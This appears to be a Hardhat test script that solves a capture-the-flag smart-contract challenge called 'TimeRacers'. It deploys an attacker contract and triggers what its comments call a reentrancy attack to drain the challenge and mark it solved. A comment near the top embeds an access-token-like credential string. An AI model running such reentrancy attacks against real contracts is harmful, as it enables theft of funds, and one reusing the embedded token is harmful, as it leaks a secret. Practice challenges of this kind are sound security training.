import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

// token: v4.local.MzzDhV45CAVBzBTSXkhB0_pVVg3PuIljYCCa2NKpveUCIKx53hJePgxkPlES4gFRBb4Z8KJ-povQASQrlIdHrn0rSWGEZjFqUNGPp9cB3Ke2CP9TtEkOPO6kTHqH-Y-lJkOaaRnGRs2rDR0W5RhSz_R-NEv0rYqOJhp2WGxIn8r-zjg
describe("TimeRacers", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    // Set the challenge instance to the address returned when deploying the challenge.
    let challenge_instance_address = "0xaf067fCB19fE5E855670677B7431195B96096110";

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);

        // comment the next two lines if running locally 
        challengeFactory = await ethers.getContractFactory("TimeRacers");
        challenge = challengeFactory.attach(challenge_instance_address);

        // uncomment if running locally:
        // challengeFactory = await ethers.getContractFactory("TimeRacers");
        // challenge = await challengeFactory.deploy({ value: ethers.utils.parseEther("0.01") }/**put your constructor args here*/);
        // await challenge.deployed();
    });

    it("Should solve the challenge", async () => {
        const attackerFactory = await ethers.getContractFactory("TimeRacersAttacker");
        const attacker = await attackerFactory.deploy(challenge.address);
        await attacker.deployed();

        const fee = await challenge.fee();
        
        // Telling the attacker to start a game
        try {
            // We send the fee * 2, so that the balance of the challenge can be even.
            const startGameTx = await attacker.startGame({ value: fee * 2, gasLimit: 100000 }); 
            const startGameReceipt = await startGameTx.wait();
            console.log("Game started successfully, attempting to attack...");
        } catch (e) {
            console.error("Failed on attacker.startGame()");
            return false;
        }

        // Telling the attacker to attack the challenge: (Submit a guess). This will start a reentrancy attack. 
        try {
            const attackTx = await attacker.attack({ gasLimit: 250000 })    // extra high gas fee because of multiple internal txs
            const attackReceipt = await attackTx.wait();
            console.log("Attack successful, checking if challenge is solved...");
        } catch (e) {
            console.error("Failed on attacker.attack()");
            return false;
        }

        // Checking balance: 
        const balance = await challenge.getBalance();
        console.log("Balance is:", ethers.utils.formatEther(balance));

        // Checking if challenge solved:
        const isSolved = await challenge.isSolved();
        expect(isSolved).to.equal(true);
    });
});